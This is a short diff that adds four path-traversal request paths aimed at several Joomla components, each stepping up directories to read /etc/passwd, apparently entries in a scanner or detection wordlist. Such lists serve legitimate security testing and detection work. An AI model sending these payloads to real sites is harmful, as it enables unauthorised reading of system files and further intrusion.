@@ -1,0 +1,4 @@
+/index.php?option=com_jequoteform&view=../../../../../../etc/passwd%00
+/index.php?option=com_jejob&view=../../../../../../etc/passwd%00
+/index.php/component/jemessenger/box_details?task=download&dw_file=../../.././../../../etc/passwd
+/propertyfinder/component/jesectionfinder/?view=../../../../../../../../../../../../../etc/passwd
